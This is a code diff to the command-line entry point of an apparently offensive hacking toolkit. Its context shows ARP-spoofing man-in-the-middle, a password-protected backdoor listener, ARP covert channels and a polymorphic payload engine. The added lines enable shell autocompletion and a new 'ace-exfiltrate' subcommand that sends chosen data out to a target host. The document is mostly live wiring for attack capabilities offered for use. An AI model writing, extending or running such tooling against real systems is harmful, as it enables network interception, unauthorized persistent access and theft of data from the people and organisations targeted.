@@ -1,6 +1,7 @@
 import argparse
 import logging
 import sys
+import argcomplete
 import json
 import threading
 import os
@@ -19,6 +20,7 @@ from modules.mitm import start_arp_spoof
 from modules.wizard import encode_wizard
 from modules.covert_channel import send_arp_covert, listen_arp_covert
 from modules.polymorphic_engine import create_polymorphic_payload, generate_encryption_stub
+from modules.ace import ace_exfiltrate
 
 def load_config(config_path='config.json'):
     """Load configuration from a JSON file."""
@@ -123,6 +125,8 @@ def main():
     backdoor_parser.add_argument("--port", type=int, default=5555, help="Port for the backdoor to listen on")
     backdoor_parser.add_argument("--password", required=True, help="Password for the backdoor")
 
+    argcomplete.autocomplete(parser)
+
     # Covert Channel
     send_arp_parser = subparsers.add_parser("send-arp", help="Send data via ARP covert channel")
     send_arp_parser.add_argument("--target-ip", required=True, help="Target IP address")
@@ -139,6 +143,11 @@ def main():
     # Wizard
     wizard_parser = subparsers.add_parser("wizard", help="Run an interactive wizard")
     wizard_parser.add_argument("--mode", required=True, choices=['encode'], help="Wizard mode to run")
+
+    # ACE
+    ace_parser = subparsers.add_parser("ace-exfiltrate", help="Use the ACE engine to exfiltrate data")
+    ace_parser.add_argument("--target", required=True, help="Target IP or domain")
+    ace_parser.add_argument("--data", required=True, help="Data to exfiltrate")
 
     args = parser.parse_args()
 
@@ -273,6 +282,9 @@ def main():
         elif args.command == "wizard":
             if args.mode == 'encode':
                 encode_wizard()
+
+        elif args.command == "ace-exfiltrate":
+            ace_exfiltrate(args.data.encode(), args.target)
 
     except Exception as e:
         logging.error(f"An error occurred: {e}", exc_info=args.verbose)
